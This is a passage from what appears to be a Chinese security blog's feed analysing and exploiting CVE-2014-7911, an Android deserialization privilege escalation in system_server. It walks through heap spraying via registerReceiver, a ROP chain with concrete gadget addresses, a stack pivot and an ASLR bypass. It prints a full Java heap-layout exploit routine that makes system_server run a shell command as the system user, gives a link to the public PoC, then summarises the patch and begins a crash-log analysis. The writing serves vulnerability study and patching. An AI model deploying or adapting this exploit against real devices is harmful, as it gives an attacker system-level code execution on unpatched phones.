<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Intent <span class="title">registerReceiver</span> <span class="params">(BroadcastReceiver receiver, IntentFilter filter, String broadcastPermission, Handler scheduler)</span></span></span><br></pre></td></tr></table></figure>
<p>其中第三个参数<code>broadcastPermission</code>为String类型，可以通过这个参数将数据注入到system_service中。</p>
<p>当我们调用registerReceiver方法时，调用流程依次为：</p>
<pre><code>ContextWrapper<span class="class">.registerReceiver</span> -&gt;
ContextImpl<span class="class">.registerReceiver</span> -&gt;
ContextImpl<span class="class">.registerReceiverInternal</span> -&gt;
ActivityManagerProxy<span class="class">.registerReceiver</span> -&gt;
ActivityManagerService.registerReceiver
</code></pre><p>该调用链表明可从某个app的Context通过binder IPC跨进程调用system_server的ActivityManagerService.registerReceiver方法，其中ActivityManagerService常驻system_server进程空间。我们再看看ActivityManagerService的registerReceiver方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Intent <span class="title">registerReceiver</span><span class="params">(IApplicationThread caller, String callerPackage, IIntentReceiver receiver, IntentFilter filter, String permission, <span class="keyword">int</span> userId)</span> </span>&#123;</span><br><span class="line">enforceNotIsolatedCaller(<span class="string">"registerReceiver"</span>);</span><br><span class="line">    <span class="keyword">int</span> callingUid;</span><br><span class="line">    <span class="keyword">int</span> callingPid;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">        ReceiverList rl = (ReceiverList)mRegisteredReceivers.get(receiver.asBinder());</span><br><span class="line">        ...</span><br><span class="line">        BroadcastFilter bf = <span class="keyword">new</span> BroadcastFilter(filter, rl, callerPackage, permission, callingUid, userId); <span class="comment">// 在Dalvik-heap中分配内存</span></span><br><span class="line">        rl.add(bf);</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">return</span> sticky;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在ActivityManagerService的registerReceiver中，通过new将在system_server进程的Dalvik-heap堆中分配内存，传入的permission字符串将常驻system_server进程空间。这样，通过调用某些系统Api，代码注入的问题就解决了。</p>
<p>其中registerReceiver具体实现细节可参考<a href="http://blog.csdn.net/luoshengyang/article/details/6737352" target="_blank" rel="external">Android应用程序注册广播接收器（registerReceiver）的过程分析</a>。</p>
<h2 id="DEP_Bypass">DEP Bypass</h2><p>由于Android使用了DEP，因此Dalvik-heap上的内存不能用来执行，这就必须使用ROP技术，使PC跳转到一系列合法指令序列（Gadget），并由这些Gadget拼凑而成shellcode，shellcode中执行system函数，然后通过system函数调用外部程序。</p>
<p><a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="external">一个寻找ROP链的工具</a><br>需要注意的是，在寻找ROP跳转指令时候，一定要从基础模块(会被zygote加载的模块)中寻找，保证内存布局是一致的，如libc，libandroid_runtime等。</p>
<p>为了调用system函数，需要控制r0寄存器，指向我们预先布置的命令行字符串作为参数。这里需要使用Stack Pivot技术，将栈顶指针SP指向控制的Dalvik-heap堆中的数据，这将为控制PC寄存器、以及在栈上布置数据带来便利，执行命令</p>
<pre><code>python ./ROPgadget<span class="class">.py</span> --thumb --binary /Users/idhyt/Downloads/libwebviewchromium<span class="class">.so</span> &gt; gadgets.txt
</code></pre><p>然后就可以寻找合适的代码片段，寻找的时候要有目的性，首先第一条指令一定尽量是我们能控制的指令，通过前边dump的崩溃信息可以看到，r0，r5，r7，r8这4个寄存器的值都是mOrgue，即这4个寄存器可控，所以第一条指令可以重点查看是这4个寄存器操作的指令，下边就是一系列繁杂的体力活，直接用exploit中的ROP进行说明。</p>
<p><strong>gadget1: libwebviewchromium.so(0x0070a93c)</strong></p>
<pre><code><span class="keyword">ldr </span><span class="literal">r7</span>, [<span class="literal">r5</span>]    // <span class="literal">r5</span> = mOrgue, <span class="literal">r7</span> = [mOrgue] = shellcode_addr
<span class="keyword">mov </span><span class="literal">r0</span>, <span class="literal">r5</span>    // <span class="literal">r0</span> = mOrgue
<span class="keyword">ldr </span><span class="literal">r1</span>, [<span class="literal">r7</span>, <span class="number">#8</span>]    // <span class="literal">r1</span> = [<span class="literal">r7</span> + <span class="number">8</span>] = [shellcode_addr + <span class="number">8</span>]
<span class="keyword">blx </span><span class="literal">r1</span>    // 跳转到[shellcode_addr + <span class="number">8</span>]执行
</code></pre><p><strong>gadget2: libdvm.so(0x000664c4)</strong></p>
<pre><code><span class="keyword">add.w </span><span class="literal">r7</span>, <span class="literal">r7</span>, <span class="number">#8</span>    // <span class="literal">r7</span> = <span class="literal">r7</span> + <span class="number">8</span> = shellcode_addr + <span class="number">8</span>
<span class="keyword">mov </span><span class="literal">sp</span>, <span class="literal">r7</span>    // <span class="literal">sp</span> = <span class="literal">r7</span> = shellcode_addr + <span class="number">8</span>
<span class="keyword">pop </span>{<span class="literal">r4</span>, <span class="literal">r5</span>, <span class="literal">r7</span>, <span class="literal">pc</span>}    // <span class="literal">r4</span>=[shellcode_addr + <span class="number">8</span>], <span class="literal">r5</span>=[shellcode_addr + <span class="number">12</span>], <span class="literal">r7</span>=[shellcode_addr + <span class="number">16</span>], <span class="literal">pc</span>=[shellcode_addr + <span class="number">20</span>], 跳转到<span class="literal">pc</span>执行
</code></pre><p><strong>gadget3: libwebviewchromium.so(0x0030c4b8)</strong> </p>
<pre><code><span class="keyword">mov </span><span class="literal">r0</span>, <span class="literal">sp</span>     //    上边<span class="literal">sp</span><span class="label">=shellcode_addr</span> + <span class="number">8</span>，然后<span class="keyword">pop出4个寄存器，所以sp=shellcode_addr </span>+ <span class="number">8</span> + <span class="number">4</span>*<span class="number">4</span> = shellcode_addr + <span class="number">24</span>
<span class="keyword">blx </span><span class="literal">r5</span>    //    <span class="literal">r5</span> = [shellcode_addr + <span class="number">12</span>] 即跳转到该处执行代码
</code></pre><p>最后一步要能执行system命令，需要r0 = system参数，r5system地址，<br>所以得出<br>[shellcode_addr + 24] = system参数<br>[shellcode_addr + 12] = system地址</p>
<p>结合堆块布局里边的约束条件<br>shellcode_addr - 4 == 1<br>[shellcode_addr + 4] == mOrgue + 12</p>
<p>最终的堆块数据布局如下所示：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2014-7911-exp-2.jpg" alt="exploit-cve-2014-7911-exp-2"></p>
<p>最后，构造ROP Chain还需要考虑一个细节，ARM有两种模式Thumb和ARM模式，我们使用的Gadgets均为Thumb模式，因此其地址的最低位均需要加1</p>
<h2 id="ASLR_Bypass">ASLR Bypass</h2><p>Android自4.1始开始启用ASLR（地址随机化），任何程序自身的的地址空间在每一次运行时都将发生变化。但在Android中，攻击程序、system_server皆由zygote进程fork而来，因此攻击程序与system_server共享同样的基础模块和dalvik-heap。只要在使用dalvik heapspray和构建ROP Gadget时，只使用libc、libdvm这些基础模块，就无需考虑地址随机化的问题。</p>
<p>Android和Linux一样提供了基于/proc的”伪文件”系统来作为查看用户进程内存映像的接口(cat /proc/pid/maps)。可以说，这是Android系统内核层开放给用户层关于进程内存信息的一扇窗户。通过它，我们可以查看到当前进程空间的内存映射情况，模块加载情况以及虚拟地址和内存读写执行（rwxp）属性等。如下图，查看两个不同进程的堆内存分布，发现基础模块堆基址都是相同的。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2014-7911-exp-3.jpg" alt="exploit-cve-2014-7911-exp-3"></p>
<p>其中，各个字段说明如下(来自stackoverflow)：</p>
<blockquote>
<p>Each row in /proc/$PID/maps describes a region of contiguous virtual memory in a process or thread. Each row has the following fields:<br>address           perms offset  dev   inode   pathname<br>08048000-08056000 r-xp 00000000 03:0c 64593   /usr/sbin/gpm<br><code>address</code> - This is the starting and ending address of the region in the process’s address space<br><code>permissions</code> - This describes how pages in the region can be accessed. There are four different permissions: read, write, execute, and shared. If read/write/execute are disabled, a ‘-‘ will appear instead of the ‘r’/‘w’/‘x’. If a region is not shared, it is private, so a ‘p’ will appear instead of an ‘s’. If the process attempts to access memory in a way that is not permitted, a segmentation fault is generated. Permissions can be changed using the mprotect system call.<br><code>offset</code> - If the region was mapped from a file (using mmap), this is the offset in the file where the mapping begins. If the memory was not mapped from a file, it’s just 0.<br><code>device</code> - If the region was mapped from a file, this is the major and minor device number (in hex) where the file lives.<br><code>inode</code> - If the region was mapped from a file, this is the file number.<br><code>pathname</code> - If the region was mapped from a file, this is the name of the file. This field is blank for anonymous mapped regions. There are also special regions with names like [heap], [stack], or [vdso]. [vdso] stands for virtual dynamic shared object. It’s used by system calls to switch to kernel mode. Here’s a good article about it.<br>You might notice a lot of anonymous regions. These are usually created by mmap but are not attached to any file. They are used for a lot of miscellaneous things like shared memory or buffers not allocated on the heap. For instance, I think the pthread library uses anonymous mapped regions as stacks for new threads.</p>
</blockquote>
<h2 id="漏洞利用代码">漏洞利用代码</h2><p>利用过程最关键堆块布局流程代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">exploitBegin</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> dalvikHeapAddr = getBase(<span class="string">"/dev/ashmem/dalvik-heap"</span>);</span><br><span class="line">    <span class="keyword">int</span> libcAddr = getBase(<span class="string">"/system/lib/libc.so"</span>);</span><br><span class="line">    <span class="keyword">int</span> libDvmAddr = getBase(<span class="string">"/system/lib/libdvm.so"</span>);</span><br><span class="line">    <span class="keyword">int</span> libWebViewChromiumAddr = getBase(<span class="string">"/system/lib/libwebviewchromium.so"</span>);</span><br><span class="line">    <span class="keyword">int</span> staticAddr = dalvikHeapAddr + <span class="number">0x01001000</span>;</span><br><span class="line"></span><br><span class="line">    Log.d(TAG, <span class="string">"staticAddr = 0x"</span> + Integer.toHexString(staticAddr));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> gadgetChunkOffset = sprayChunkLength - gadgetChunkLength;</span><br><span class="line">    <span class="comment">// java中char占两个字节</span></span><br><span class="line">    <span class="keyword">char</span>[] bytes = <span class="keyword">new</span> <span class="keyword">char</span>[sprayChunkLength / <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; gadgetChunkOffset / <span class="number">2</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        value = staticAddr + gadgetChunkOffset - (<span class="number">2</span> * i);</span><br><span class="line">        <span class="comment">// 低位</span></span><br><span class="line">        bytes[i] = (<span class="keyword">char</span>) value;</span><br><span class="line">        <span class="comment">// 高位</span></span><br><span class="line">        bytes[i + <span class="number">1</span>] = (<span class="keyword">char</span>) ((value &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 约束条件 shellcode_addr - 4 == 1</span></span><br><span class="line">    value = <span class="number">1</span>;</span><br><span class="line">    bytes[gadgetChunkOffset / <span class="number">2</span> - <span class="number">2</span>] = (<span class="keyword">char</span>) value;</span><br><span class="line">    bytes[gadgetChunkOffset / <span class="number">2</span> - <span class="number">1</span>] = (<span class="keyword">char</span>) ((value &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 约束条件 [shellcode_addr + 4] == mOrgue + 12</span></span><br><span class="line">    value = staticAddr + <span class="number">0xC</span>;</span><br><span class="line">    bytes[gadgetChunkOffset / <span class="number">2</span> + <span class="number">2</span>] = (<span class="keyword">char</span>) value;</span><br><span class="line">    bytes[gadgetChunkOffset / <span class="number">2</span> + <span class="number">3</span>] = (<span class="keyword">char</span>) ((value &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// shellcode数据布局 [shellcode_addr] = gadget1_addr</span></span><br><span class="line">    value = libWebViewChromiumAddr + rop_chain[<span class="number">0</span>]; <span class="comment">// libwebviewchromium.so(0x0070a93c): ldr r7, [r5] ; mov r0, r5 ; ldr r1, [r7, #8] ; blx r1</span></span><br><span class="line">    bytes[gadgetChunkOffset / <span class="number">2</span>] = (<span class="keyword">char</span>) value;</span><br><span class="line">    bytes[gadgetChunkOffset / <span class="number">2</span> + <span class="number">1</span>] = (<span class="keyword">char</span>) ((value &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// shellcode数据布局 [shellcode_addr + 8] = gadget2_addr</span></span><br><span class="line">    value = libDvmAddr + rop_chain[<span class="number">1</span>]; <span class="comment">// libdvm.so(0x000664c4): add.w r7, r7, #8 ; mov sp, r7 ; pop &#123;r4, r5, r7, pc&#125;</span></span><br><span class="line">    bytes[gadgetChunkOffset / <span class="number">2</span> + <span class="number">4</span>] = (<span class="keyword">char</span>) value;</span><br><span class="line">    bytes[gadgetChunkOffset / <span class="number">2</span> + <span class="number">5</span>] = (<span class="keyword">char</span>) ((value &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// shellcode数据布局 [shellcode_addr + 12] = system_addr</span></span><br><span class="line">    value = libcAddr + rop_chain[<span class="number">2</span>]; <span class="comment">// system</span></span><br><span class="line">    bytes[gadgetChunkOffset / <span class="number">2</span> + <span class="number">6</span>] = (<span class="keyword">char</span>) value;</span><br><span class="line">    bytes[gadgetChunkOffset / <span class="number">2</span> + <span class="number">7</span>] = (<span class="keyword">char</span>) ((value &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// shellcode数据布局 [shellcode_addr + 20] = gadget3_addr</span></span><br><span class="line">    value = libWebViewChromiumAddr + rop_chain[<span class="number">3</span>]; <span class="comment">// libwebviewchromium.so(0x0030c4b8): mov r0, sp ; blx r5</span></span><br><span class="line">    bytes[gadgetChunkOffset / <span class="number">2</span> + <span class="number">10</span>] = (<span class="keyword">char</span>) value;</span><br><span class="line">    bytes[gadgetChunkOffset / <span class="number">2</span> + <span class="number">11</span>] = (<span class="keyword">char</span>) ((value &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// system_param cmd = "id &gt;/data/exploit.txt"</span></span><br><span class="line">    <span class="keyword">int</span>[] values = stringToInt(cmd);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; values.length; i++) &#123;</span><br><span class="line">        bytes[gadgetChunkOffset / <span class="number">2</span> + <span class="number">12</span> + i * <span class="number">2</span>] = (<span class="keyword">char</span>) values[i];</span><br><span class="line">        bytes[gadgetChunkOffset / <span class="number">2</span> + <span class="number">13</span> + i * <span class="number">2</span>] = (<span class="keyword">char</span>) ((values[i] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 堆喷</span></span><br><span class="line">    String str = String.valueOf(bytes);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2000</span>; i++) &#123;</span><br><span class="line">        heapSpary(str);</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">100</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            Log.d(TAG, <span class="string">"heap sparying... "</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 触发</span></span><br><span class="line">    exploit(staticAddr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用代码详见：<a href="https://github.com/retme7/CVE-2014-7911_poc" target="_blank" rel="external">CVE-2014-7911_poc</a><br>将利用代码中的system参数即String cmd改为<code>id &gt;/data/exploit.txt</code>，这条命令将获取用户UID和GID，并以system权限将其写入<code>/data/exploit.txt</code>文件中。执行过如下图所示：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/exploit-cve-2014-7911-exp-4.jpg" alt="exploit-cve-2014-7911-exp-3"></p>
<h2 id="修复">修复</h2><p><a href="https://android.googlesource.com/platform/libcore/+/738c833d38d41f8f76eb7e77ab39add82b1ae1e2%5E%21/#F0" target="_blank" rel="external">修复代码</a>涉及与反序列化相关的 ObjectInputStream.java、ObjectStreamClass.java、ObjectStreamConstants.java、SerializationTest.java等文件。主要加了三种检查：</p>
<ol>
<li>检查反序列化的类是否仍然满足序列化的需求；</li>
<li>检查反序列化的类的类型是否与stream中所持有的类型信息 (enum, serializable, externalizable)一致</li>
<li>在某些情形下，延迟类的静态初始化，直到对序列化流的内容检查完成。</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>在<a href="http://blog.idhyt.com/2015/07/31/exploit-cve-2014-7911/">CVE-2014-7911安卓本地提权漏洞分析</a>中，已经分析了漏洞的成因和触发时机。<br>POC崩溃到mOrgue，从该地址处取值，]]>
    </summary>
    
      <category term="cve" scheme="http://blog.idhyt.com/tags/cve/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2014-7911安卓本地提权漏洞分析]]></title>
    <link href="http://blog.idhyt.com/2015/07/31/exploit-cve-2014-7911/"/>
    <id>http://blog.idhyt.com/2015/07/31/exploit-cve-2014-7911/</id>
    <published>2015-07-31T15:28:11.000Z</published>
    <updated>2016-02-19T09:42:32.000Z</updated>
    <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>CVE-2014-7911是由Jann Horn发现的一个有关安卓的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令，影响版本包括4.4以前所有的版本。该漏洞是一个非常有学习价值的漏洞，其涉及的知识非常广泛，包括Java序列化与反序列化、Dalvik GC机制、Android binder机制、heap spary、ROP、stack pivot。</p>
<p>该漏洞的成因在于java.io.ObjectInputStream类在反序列化输入的数据时，并不验证其合法性，攻击者可以利用此漏洞构造恶意对象在sysem_server进程中执行任意代码并获取提升的权限。但是我google大部分关于这个漏洞的文章，没有一个分析文章能将漏洞的触发流程与这个点串起来的逻辑，或者说文章中根本就没有在提及这个点，这个过程发生在sysem_server处理Parcel数据的时候有个unparcel过程，下边会有详细的逻辑流程。</p>
<h2 id="调试环境和工具">调试环境和工具</h2><p>nexus 5<br>android 4.4<br>android studio</p>
<h2 id="漏洞触发">漏洞触发</h2><h3 id="触发">触发</h3><p>先下载漏洞<a href="http://seclists.org/fulldisclosure/2014/Nov/51" target="_blank" rel="external">poc</a>编译过后安装到手机中，一定要拿实体机测试，在genymotion等虚拟机中无法通过反射获取到系统服务。</p>
<p>清除日志 adb logcat -c<br>开启日志 adb logcat<br>运行poc，手机重启，查看崩溃日志</p>
<pre><code>--------- <span class="keyword">beginning </span>of /dev/log/main
I/System.out(<span class="number">10603</span>): <span class="number">1</span> inner classes found
I/System.out(<span class="number">10603</span>): <span class="number">1</span> inner classes found
D/audio_hw_primary( <span class="number">8448</span>): <span class="keyword">select_devices: </span>out_snd_device(<span class="number">2</span>: speaker) in_snd_device(<span class="number">0</span>: )
--------- <span class="keyword">beginning </span>of /dev/log/system
E/UserManagerService( <span class="number">8753</span>): Error writing application restrictions list
D/dalvikvm( <span class="number">8753</span>): GC_FOR_ALLOC freed <span class="number">134</span>K, <span class="number">4</span>% free <span class="number">24602</span>K/<span class="number">25472</span>K, paused <span class="number">32</span>ms, total <span class="number">32</span>ms
F/libc    ( <span class="number">8753</span>): Fatal signal <span class="number">11</span> (SIGSEGV) at <span class="number">0x1337bef3</span> (<span class="preprocessor">code</span><span class="number">=1</span>), thread <span class="number">8761</span> (FinalizerDaemon)
D/dalvikvm( <span class="number">8753</span>): GC_FOR_ALLOC freed <span class="number">856</span>K, <span class="number">7</span>% free <span class="number">24582</span>K/<span class="number">26312</span>K, paused <span class="number">31</span>ms, total <span class="number">31</span>ms
D/dalvikvm( <span class="number">8753</span>): GC_FOR_ALLOC freed <span class="number">836</span>K, <span class="number">7</span>% free <span class="number">24582</span>K/<span class="number">26312</span>K, paused <span class="number">35</span>ms, total <span class="number">35</span>ms
I/ActivityManager( <span class="number">8753</span>): START u0 {act<span class="label">=android</span>.intent.action.MAIN cat=[<span class="keyword">android.intent.category.HOME] </span>flg<span class="number">=0x10200000</span> <span class="keyword">cmp=com.google.android.googlequicksearchbox/com.google.android.launcher.GEL} </span>from pid <span class="number">8753</span>
D/audio_hw_primary( <span class="number">8448</span>): <span class="keyword">select_devices: </span>out_snd_device(<span class="number">2</span>: speaker) in_snd_device(<span class="number">0</span>: )
I/DEBUG   (  <span class="number">175</span>): *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
I/DEBUG   (  <span class="number">175</span>): <span class="keyword">Build </span>fingerprint: <span class="string">'google/hammerhead/hammerhead:4.4.4/KTU84P/1227136:user/release-keys'</span>
I/DEBUG   (  <span class="number">175</span>): <span class="keyword">Revision: </span><span class="string">'11'</span>
I/DEBUG   (  <span class="number">175</span>): pid: <span class="number">8753</span>, tid: <span class="number">8761</span>, name: FinalizerDaemon  &gt;&gt;&gt; system_server &lt;&lt;&lt;
I/DEBUG   (  <span class="number">175</span>): signal <span class="number">11</span> (SIGSEGV), <span class="preprocessor">code</span> <span class="number">1</span> (SEGV_MAPERR), fault <span class="keyword">addr </span><span class="number">1337</span>bef3
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">r0</span> <span class="number">1337</span>beef  <span class="literal">r1</span> <span class="number">401899</span><span class="literal">d9</span>  <span class="literal">r2</span> <span class="number">71082008</span>  <span class="literal">r3</span> <span class="number">6</span>d468dc4
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">r4</span> <span class="number">401899</span><span class="literal">d9</span>  <span class="literal">r5</span> <span class="number">1337</span>beef  <span class="literal">r6</span> <span class="number">713</span>c12e8  <span class="literal">r7</span> <span class="number">1337</span>beef
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">r8</span> <span class="number">1337</span>beef  <span class="literal">r9</span> <span class="number">746</span>daf68  <span class="literal">sl</span> <span class="number">71082018</span>  <span class="literal">fp</span> <span class="number">74</span>a7eb24
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">ip</span> <span class="number">401</span>c18a4  <span class="literal">sp</span> <span class="number">74</span>a7eae8  <span class="literal">lr</span> <span class="number">40188981</span>  <span class="literal">pc</span> <span class="number">400</span>d6176  <span class="keyword">cpsr </span><span class="number">200</span>f0030
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d0</span>  <span class="number">0000000000000001</span>  <span class="literal">d1</span>  <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d2</span>  <span class="number">6</span>d4aece800000000  <span class="literal">d3</span>  <span class="number">0000010000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d4</span>  <span class="number">0000000000000000</span>  <span class="literal">d5</span>  <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d6</span>  <span class="number">0000000000000000</span>  <span class="literal">d7</span>  <span class="number">42</span>c800004bb98bb4
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d8</span>  <span class="number">0000000000000000</span>  <span class="literal">d9</span>  <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d10</span> <span class="number">0000000000000000</span>  <span class="literal">d11</span> <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d12</span> <span class="number">0000000000000000</span>  <span class="literal">d13</span> <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d14</span> <span class="number">0000000000000000</span>  <span class="literal">d15</span> <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d16</span> ffffffff00000013  <span class="literal">d17</span> <span class="number">00000006</span>ffffffff
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d18</span> <span class="number">0000000000000000</span>  <span class="literal">d19</span> <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d20</span> <span class="number">0000000000000000</span>  <span class="literal">d21</span> <span class="number">0002000200020002</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d22</span> <span class="number">0000000000000000</span>  <span class="literal">d23</span> <span class="number">0000000000000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d24</span> <span class="number">0000000000000000</span>  <span class="literal">d25</span> <span class="number">0002</span>a7600002a760
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d26</span> <span class="number">0707070703030303</span>  <span class="literal">d27</span> <span class="number">0300000004000000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d28</span> <span class="number">0800000009000000</span>  <span class="literal">d29</span> <span class="number">0001000000010000</span>
I/DEBUG   (  <span class="number">175</span>):     <span class="literal">d30</span> <span class="number">010</span>b400001088000  <span class="literal">d31</span> <span class="number">01108000010</span>e0000
I/DEBUG   (  <span class="number">175</span>):     scr <span class="number">60000010</span>
I/DEBUG   (  <span class="number">175</span>):
I/DEBUG   (  <span class="number">175</span>): <span class="keyword">backtrace:
</span>I/DEBUG   (  <span class="number">175</span>):     <span class="number">#00</span>  <span class="literal">pc</span> <span class="number">0000</span>d176  /system/lib/libutils.so (<span class="keyword">android::RefBase::decStrong(void </span>const*) const+<span class="number">3</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#01</span>  <span class="literal">pc</span> <span class="number">0007097</span>d  /system/lib/libandroid_runtime.so
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#02</span>  <span class="literal">pc</span> <span class="number">0001</span>dbcc  /system/lib/libdvm.so (dvmPlatformInvoke+<span class="number">112</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#03</span>  <span class="literal">pc</span> <span class="number">0004</span>e123  /system/lib/libdvm.so (dvmCallJNIMethod(unsigned int const*, JValue*, Method const*, Thread*)+<span class="number">398</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#04</span>  <span class="literal">pc</span> <span class="number">00026</span>fe0  /system/lib/libdvm.so
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#05</span>  <span class="literal">pc</span> <span class="number">0002</span>dfa0  /system/lib/libdvm.so (dvmMterpStd(Thread*)+<span class="number">76</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#06</span>  <span class="literal">pc</span> <span class="number">0002</span>b638  /system/lib/libdvm.so (dvmInterpret(Thread*, Method const*, JValue*)+<span class="number">184</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#07</span>  <span class="literal">pc</span> <span class="number">0006057</span>d  /system/lib/libdvm.so (dvmCallMethodV(Thread*, Method const*, Object*, <span class="keyword">bool, </span>JValue*, std::__va_list)+<span class="number">336</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#08</span>  <span class="literal">pc</span> <span class="number">000605</span><span class="literal">a1</span>  /system/lib/libdvm.so (dvmCallMethod(Thread*, Method const*, Object*, JValue*, ...)+<span class="number">20</span>)
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#09</span>  <span class="literal">pc</span> <span class="number">00055287</span>  /system/lib/libdvm.so
I/DEBUG   (  <span class="number">175</span>):     <span class="number">#10</span>  <span class="literal">pc</span> <span class="number">0000</span>d170  /system/lib/libc.so (__thread_entry+<span class="number">72</span>)
